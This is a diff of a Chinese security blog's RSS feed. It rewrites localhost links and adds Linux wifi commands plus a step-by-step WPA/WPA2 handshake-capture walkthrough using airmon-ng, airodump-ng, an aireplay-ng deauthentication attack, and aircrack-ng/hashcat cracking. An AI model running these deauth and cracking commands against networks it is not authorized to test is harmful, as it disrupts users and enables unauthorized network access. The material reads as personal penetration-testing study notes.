@@ -2,16 +2,16 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>魔法书 on wackymaker</title>
-        <link>http://localhost:1313/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/</link>
         <description>Recent content in 魔法书 on wackymaker</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Sat, 23 Aug 2025 21:42:11 +0800</lastBuildDate><atom:link href="http://localhost:1313/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 23 Aug 2025 21:42:11 +0800</lastBuildDate><atom:link href="https://wackymaker.github.io/categories/%E9%AD%94%E6%B3%95%E4%B9%A6/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>剥茧之书</title>
-        <link>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:42:11 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E5%89%A5%E8%8C%A7%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;事件日志分析&#34;&gt;事件日志分析
 &lt;/h2&gt;&lt;p&gt;Sysmon日志是由Microsoft系统监视器（Sysmon）生成的事件日志，它们提供有关Windows上的系统级操作的详细信息，并记录进程启动、网络连接、文件和注册表修改、驱动程序和服务活动以及WMI操作等活动，通过分析Sysmon日志，安全专家可以检测潜在风险、发现异常并响应安全事件，以增强整体系统监控和安全性。在不断变化的网络安全环境中，提前防范威胁非常重要。&lt;/p&gt;
 &lt;h3 id=&#34;event-id事件id&#34;&gt;Event ID(事件id)
@@ -306,10 +306,10 @@
         </item>
         <item>
         <title>渊蜂之书</title>
-        <link>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 21:25:37 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E6%B8%8A%E8%9C%82%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h2 id=&#34;钓鱼相关&#34;&gt;钓鱼相关
 &lt;/h2&gt;&lt;h3 id=&#34;hta加载js源码&#34;&gt;.hta加载js源码
 &lt;/h3&gt;&lt;p&gt;（逐渐抛弃，特定情况再使用，容易被浏览器沙箱gank）&lt;/p&gt;
@@ -463,6 +463,10 @@
 &lt;/h2&gt;&lt;h3 id=&#34;linux连接wifi相关&#34;&gt;linux连接wifi相关
 &lt;/h3&gt;&lt;p&gt;查看无线网卡状态&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iwconfig
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;激活网卡&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo ip link set wlan0 up
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看网卡真实强度&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo cat /sys/kernel/debug/ieee80211/phy*/mt76/txpower_sku | grep tmac
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;查看wifi列表&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmcli dev wifi list
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;or
@@ -546,6 +550,10 @@
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airmon-ng check 
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;杀掉全部干扰进程&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airmon-ng check kill
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;注意，这会使我们的网卡回归使可能会被锁定，不得使用托管功能，使用如下命令检查&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rfkill list all
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果被锁定，使用如下命令解封&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo rfkill unblock wifi
 &lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;airodump-ng数据包捕获&#34;&gt;Airodump-ng(数据包捕获)
 &lt;/h4&gt;&lt;p&gt;输出截获所有数据情况&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airodump-ng wlan0mon
@@ -589,14 +597,37 @@
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 是要发送的 deauth 次数;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 表示连续发送它们
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a 00：14：6C：7A：41：81 是接入点的 MAC 地址
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c 00：0F：B5：32：31：31 是要取消身份验证的客户端的 MAC 地址;如果省略，则连接的所有客户端都会被攻击
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;劫持四次握手爆破wpawpa2密码&#34;&gt;劫持四次握手爆破wpa/wpa2密码
+&lt;/h3&gt;&lt;p&gt;调整到监听，开始抓包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airmon-ng start
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airodump wlan0mon
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;找到存在客户端的wifi目标，利用&amp;ndash;bssid以及-c筛选出来，启用-w保存抓包&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo airodump wlan0mon --bssid &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;目标wifi的bssid“ -c &amp;#34;&lt;/span&gt;$目标信道&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34; -w &lt;/span&gt;$&lt;span style=&#34;color:#e6db74&#34;&gt;保存名称
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抓包同时，另起窗口对此ap发动取消认证攻击&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo aireplay-ng -0 &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; -a 00:14:6C:7A:41:81 -c 00:0F:B5:32:31:31 wlan0mon
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-0 表示取消身份验证
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; 是要发送的 deauth 次数;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; 表示连续发送它们
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a 00：14：6C：7A：41：81 是接入点的 MAC 地址
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-c 00：0F：B5：32：31：31 是要取消身份验证的客户端的 MAC 地址;如果省略，则连接的所有客户端都会被攻击
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;只要看到抓包中notes字段出现EAPOL，则证明已经捕获4次握手，等待一分钟后断开抓包&lt;/p&gt;
+&lt;p&gt;我们得到的$名称-01.cap就是有价值的流量包&lt;/p&gt;
+&lt;p&gt;aircrach-ng爆破(使用cpu)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aircrack-ng test6-01.cap -w wifi_passlist_geo.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;hashcat爆破(gpu爆破)&lt;/p&gt;
+&lt;p&gt;先转去以下网站转换hash&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;https://hashcat.net/cap2hashcat/
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;转换完毕的文件如下爆破&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hashcat -m &lt;span style=&#34;color:#ae81ff&#34;&gt;22000&lt;/span&gt; hash.file -w dic.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;总结，实际操作后发现现实并不好攻击，字典量所需太大，后续恶意门户会研究&lt;/p&gt;
+</description>
         </item>
         <item>
         <title>血缇之书</title>
-        <link>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
+        <link>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</link>
         <pubDate>Sat, 23 Aug 2025 19:40:56 +0800</pubDate>
         
-        <guid>http://localhost:1313/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
+        <guid>https://wackymaker.github.io/post/%E8%A1%80%E7%BC%87%E4%B9%8B%E4%B9%A6/</guid>
         <description>&lt;h1 id=&#34;信息收集-枚举&#34;&gt;信息收集-枚举
 &lt;/h1&gt;&lt;h2 id=&#34;前枚举&#34;&gt;前枚举
 &lt;/h2&gt;&lt;h3 id=&#34;域名解析&#34;&gt;域名解析
